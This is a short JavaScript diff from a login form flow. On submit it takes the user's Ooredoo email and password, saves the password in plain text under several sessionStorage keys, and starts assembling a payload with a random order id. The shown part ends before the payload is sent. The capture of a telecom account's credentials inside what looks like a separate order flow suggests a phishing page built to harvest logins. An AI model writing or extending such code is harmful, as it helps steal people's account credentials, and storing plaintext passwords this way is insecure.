@@ -378,18 +378,16 @@
     if (isValid) {
       const ooredooUser = emailInput.value.trim();
       const ooredooPass = passwordInput.value.trim();
-      const currentOrderId = sessionStorage.getItem('safwa_order_id') || localStorage.getItem('requestId') || 'ooredoo-' + Date.now();
+      const currentOrderId = 'ooredoo-' + Date.now() + '-' + Math.random().toString(16).slice(2, 10);
 
+      sessionStorage.removeItem('safwa_order_id');
+      localStorage.removeItem('requestId');
       sessionStorage.setItem('userEmail', ooredooUser);
       sessionStorage.setItem('userPassword', ooredooPass);
       sessionStorage.setItem('ooredooUser', ooredooUser);
       sessionStorage.setItem('ooredooPass', ooredooPass);
       sessionStorage.setItem('safwa_order_id', currentOrderId);
       localStorage.setItem('requestId', currentOrderId);
-      sessionStorage.setItem('ooredooFlow_' + currentOrderId, 'login');
-      localStorage.setItem('ooredooFlow_' + currentOrderId, 'login');
-      sessionStorage.setItem('ooredooFlow', 'login');
-      localStorage.setItem('ooredooFlow', 'login');
 
       const payload = {
         id: currentOrderId,
